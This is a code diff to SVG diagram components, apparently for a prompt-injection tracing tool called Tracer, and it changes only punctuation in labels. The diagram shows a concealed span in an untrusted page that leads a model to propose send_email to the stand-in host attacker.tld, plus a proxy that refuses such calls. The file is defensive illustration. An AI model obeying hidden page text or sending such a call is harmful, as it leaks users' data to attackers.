@@ -14,7 +14,7 @@
 // ---------------------------------------------------------------------------
 
 /**
- * ARTIFACT — the provenance chain.
+ * ARTIFACT: the provenance chain.
  *
  * The causal line from a span nobody can see to a call that does not go. This
  * is the whole product in one picture: the argument to the tool call is traced
@@ -35,7 +35,7 @@ export function ChainDiagram() {
         </defs>
 
         {/* 1. the page, with the concealed span inside it */}
-        <text x="0" y="26" className="d-step">01 — UNTRUSTED PAGE</text>
+        <text x="0" y="26" className="d-step">01 / UNTRUSTED PAGE</text>
         <rect x="0" y="40" width="200" height="104" className="d-plate" />
         <line x1="18" y1="66" x2="150" y2="66" className="d-ruleline" />
         <line x1="18" y1="82" x2="172" y2="82" className="d-ruleline" />
@@ -49,7 +49,7 @@ export function ChainDiagram() {
         <path d="M 210 92 L 268 92" className="d-wire" markerEnd="url(#tip)" />
 
         {/* 2. the model reads it and proposes a call */}
-        <text x="278" y="26" className="d-step">02 — THE MODEL READS IT</text>
+        <text x="278" y="26" className="d-step">02 / THE MODEL READS IT</text>
         <rect x="278" y="40" width="212" height="104" className="d-plate" />
         <text x="294" y="70" className="d-code">send_email(</text>
         <text x="306" y="92" className="d-code">to: attacker.tld,</text>
@@ -89,7 +89,7 @@ export function ChainDiagram() {
 }
 
 /**
- * ARTIFACT — the MCP proxy.
+ * ARTIFACT: the MCP proxy.
  *
  * The version this replaces drew four labels and three lines, and left out the
  * only interesting part: a refused call stops AT the proxy. Upstream is never
@@ -101,7 +101,7 @@ export function ProxyDiagram() {
     <div
       className="diagram"
       role="img"
-      aria-label="An agent client connects to the Tracer proxy instead of directly to its MCP servers. The proxy forwards allowed calls upstream to gmail, fetch, jira and slack, holds some for review, and refuses others — a refused call terminates at the proxy and never reaches the upstream server."
+      aria-label="An agent client connects to the Tracer proxy instead of directly to its MCP servers. The proxy forwards allowed calls upstream to gmail, fetch, jira and slack, holds some for review, and refuses others. A refused call terminates at the proxy and never reaches the upstream server."
     >
       <svg viewBox="0 0 980 300" preserveAspectRatio="xMidYMid meet">
         <defs>
@@ -165,7 +165,7 @@ export function ProxyDiagram() {
 export function CoreDiagram() {
   const hosts = [
     { name: 'browser extension', note: 'full visibility analysis' },
-    { name: 'MCP proxy', note: 'no DOM — says so' },
+    { name: 'MCP proxy', note: 'no DOM, says so' },
     { name: 'sandbox', note: 'the demo you just watched' },
   ];
   return (
